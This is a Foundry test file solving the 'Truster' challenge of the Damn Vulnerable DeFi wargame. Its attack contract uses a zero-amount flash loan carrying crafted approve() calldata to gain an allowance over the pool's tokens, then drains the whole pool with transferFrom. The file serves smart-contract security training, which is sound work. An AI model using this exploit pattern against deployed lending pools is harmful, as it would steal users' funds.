// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";

contract AttackTruster {
    TrusterLenderPool public pool;
    DamnValuableToken public token;
    address public recovery;

    constructor(address _pool, address _token, address _recovery) {
        pool = TrusterLenderPool(_pool);
        token = DamnValuableToken(_token);
        recovery = _recovery;
    }

    function attack() external {
        // Craft the data to call approve on the token contract, giving the player allowance to spend the pool's tokens
        bytes memory _callData = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            token.balanceOf(address(pool))
        );

        // Call flashLoan with 0 amount, but with the data to call approve on the token contract
        pool.flashLoan(0, address(this), address(token), _callData);
        token.transferFrom(address(pool), recovery, token.balanceOf(address(pool)));
    }
}

contract TrusterChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    
    uint256 constant TOKENS_IN_POOL = 1_000_000e18;

    DamnValuableToken public token;
    TrusterLenderPool public pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Deploy token
        token = new DamnValuableToken();

        // Deploy pool and fund it
        pool = new TrusterLenderPool(token);
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(token.balanceOf(player), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_truster() public checkSolvedByPlayer {
        console.log("### test_truster start ###");

        console.log("");
        console.log("#1 Before attack");
        console.log("pool balance:", token.balanceOf(address(pool))/1e18);
        console.log("player balance:", token.balanceOf(address(player))/1e18);
        console.log("recovery balance:", token.balanceOf(recovery)/1e18);

        console.log("");
        console.log("#2 Run attack");
        run_attack();

        console.log("");
        console.log("#3 After attack");
        console.log("pool balance:", token.balanceOf(address(pool))/1e18);
        console.log("player balance:", token.balanceOf(address(player))/1e18);
        console.log("recovery balance:", token.balanceOf(recovery)/1e18);

        console.log("");
        console.log("### test_naiveReceiver end ###");
    }

    function run_attack() internal {
        AttackTruster attackContract = new AttackTruster(address(pool), address(token), recovery);
        attackContract.attack();
    }

    /**
     * Failure Tests
     * This test should fail, as vm.getNonce(player) should be 0.
     */
    function fail_test_truster() public checkSolvedByPlayer {
        bytes memory _callData = abi.encodeWithSignature(
            "approve(address,uint256)",
            player,
            TOKENS_IN_POOL
        );

        pool.flashLoan(0, player, address(token), _callData);
        token.transferFrom(address(pool), recovery, TOKENS_IN_POOL);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        // All rescued funds sent to recovery account
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
    }
}
